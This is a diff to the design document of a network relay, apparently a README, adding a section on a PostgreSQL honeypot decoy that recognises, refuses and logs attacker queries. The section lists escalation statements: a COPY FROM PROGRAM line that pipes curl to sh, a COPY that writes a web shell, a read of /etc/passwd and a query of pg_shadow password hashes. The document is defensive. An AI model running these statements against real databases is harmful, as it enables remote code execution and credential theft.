@@ -39,7 +39,8 @@ exist.
 - [A controller that is not there](#a-controller-that-is-not-there)
 - [An agent that is not there](#an-agent-that-is-not-there)
 - [A cache that is not there](#a-cache-that-is-not-there)
-- [A database that is not there](#a-database-that-is-not-there)
+- [A MySQL that is not there](#a-mysql-that-is-not-there)
+- [A PostgreSQL that is not there](#a-postgresql-that-is-not-there)
 - [Refusal at the TLS handshake](#refusal-at-the-tls-handshake)
 - [What it produces](#what-it-produces)
 - [Building it out](#building-it-out)
@@ -87,7 +88,7 @@ Two consequences worth stating plainly:
 | Deceptive answer | `routes[].deceive` | Certainty — it cannot tell a find from a miss | **A real client silently loses data** | Must be none |
 | Fabricated device | `modbus.deception`, `iec104.deception`, `s7.deception`, `snmp.deception` | A plant it must map, all of it wrong; the tripwire that fires while it does | A frame on its way to a real device answered by the fabrication -- which is what the one rule exists to prevent | None: it answers only where a refusal would be |
 | Fabricated cache | `redis.deception` | The whole exploit chain, answered -- and its directory, file name and payload in your log | The same, plus a value read back that was never stored | None, as above |
-| Fabricated database | `mysql.deception` | The reconnaissance, answered consistently -- and which of four escalations it was for | The same, plus an empty result set where a real query needed rows | None, as above |
+| Fabricated database | `mysql.deception`, `postgres.deception` | The reconnaissance, answered consistently -- and which escalation it was for: a web shell, a key off the server, a file off the *client*, or, on PostgreSQL, a shell command the manual documents | The same, plus an empty result set where a real query needed rows | None, as above |
 | Handshake refusal | `handshake` | A key exchange it does not get to spend | A client refused with no log line to explain it | Only what the ban list holds |
 
 ## How the signals chain
@@ -764,7 +765,7 @@ of the estate's own credentials as often as not. Everything else *is* recorded,
 one line and clipped, because on this protocol the arguments are the message —
 the directory, the file name, the replication target, the cron entry.
 
-## A database that is not there
+## A MySQL that is not there
 
 The cache above is attacked by a script. A database is attacked by somebody
 reading the answers — and on MySQL the reading is done with statements that are,
@@ -846,6 +847,98 @@ cannot maintain.
 **And the password is never recorded.** The login's user name, plugin and program
 name are kept, because they are identities; the authentication response is not,
 for the reason the SNMP section gives about community strings.
+
+## A PostgreSQL that is not there
+
+The MySQL above is the commoner find. This one is the more dangerous, because
+PostgreSQL can run a shell command *by design* and the statement that does it is
+in the manual.
+
+The reconnaissance is shorter here, and it turns on one question:
+
+```
+SELECT version()                          what is this
+SELECT current_setting('data_directory')  where does it keep its files
+SELECT usesuper FROM pg_user WHERE …      is this role a superuser
+SELECT datname FROM pg_database           what is here
+```
+
+The third answer decides what the fourth is for:
+
+```
+COPY t FROM PROGRAM 'curl http://…|sh'    a shell command, documented
+COPY t TO '/var/www/html/s.php'           a web shell
+SELECT pg_read_file('/etc/passwd')        a file off the server
+CREATE FUNCTION … LANGUAGE c              a shared object
+SELECT usename, passwd FROM pg_shadow     the password hashes
+```
+
+A role that is not a superuser can do none of it. So the most consequential line
+in this section is one boolean:
+
+```yaml
+# A honeypot: a database on the application network with nothing behind it.
+- name: pg-spare
+  address: "10.70.0.42:5432"
+  kind: postgres
+  postgres:
+    require_tls: false
+    deception:
+      mode: decoy
+      profile: rails
+      version: "13.14 (Debian 13.14-1.pgdg120+2)"   # …what the estate's own servers say…
+      tables: ["public.users", "public.accounts"]
+      superuser: false      # the field to think about
+```
+
+**`superuser: false` is the default and usually the right answer.** A decoy that
+says yes is impersonating the account every scanner is hoping to find, and the next
+statement will be `COPY ... FROM PROGRAM`. Saying no is both safer to impersonate
+and the more common truth on an estate's application accounts — and a visitor who
+is told no and tries it anyway has told you more than one who was told yes.
+
+**The rule is the same one**: a statement that was going to reach the server is
+never answered by the fabrication. On a real listener (`mode: answer`) it sits
+exactly where a refusal would be written.
+
+**The answers have to agree with each other.** The `is_superuser` parameter in the
+startup sequence and the answer to `SELECT usesuper` are the same fact, and every
+`COPY` and every file function is refused the way that fact requires — the
+permission error a plain role gets, or, for a superuser, the error a program that
+failed gives, which is still not a success. Each of the thirteen parameters the
+startup announces can be asked about again with `SHOW` and gives the same value, in
+the form that question takes: a real server says `on` or `off` to
+`SHOW is_superuser` and `t` or `f` to the catalogue's `usesuper`, and a fabrication
+that mixed the two is caught by exactly the check a fingerprinting tool makes. The
+catalogue tables that hold authentication material answer SQLSTATE 42501 rather
+than an empty set, because an empty set would say the table is there and has no
+rows, which `pg_shadow` never is.
+
+**It runs nothing, waits for nothing, and invents nothing.** `COPY FROM PROGRAM`
+never answers a success. `pg_sleep(60)` is answered rather than honoured, because
+honouring it would make this listener's resources something a visitor can hold a
+statement at a time. And a `SELECT` the recognisers do not know returns an empty
+result set, for the reason the MySQL section gives: the fabrication is a surface,
+and inventing rows for an arbitrary projection would mean inventing a schema to
+match.
+
+**The tripwires need no configuring** — the escalation chain is the same on every
+estate. One of them is recognised by *shape* rather than by name: a `COPY` naming a
+server-side path mentions no privileged identifier at all, because the path is a
+string literal, so `COPY t TO '/var/www/html/s.php'` is caught by what it is doing
+rather than by what it names.
+
+**There is no password to leave out.** On this protocol the startup packet carries
+no credential — the role, the database and the application name are all a client
+announces before the exchange — so the record has the identities and nothing else.
+Where `require_auth` is set the fabrication asks for a credential, so that the
+refusal looks like a checked one, and records its **length**.
+
+**Unlike the MySQL decoy, this one can be behind TLS.** The encryption is
+negotiated before the startup packet here and the relay answers the `SSLRequest`
+itself, so a `decoy` listener with a `tls` section serves a client that insists on
+`sslmode=require` — which is worth having, because a database that refuses TLS is
+itself a thing a careful scanner notices.
 
 ## Refusal at the TLS handshake
 
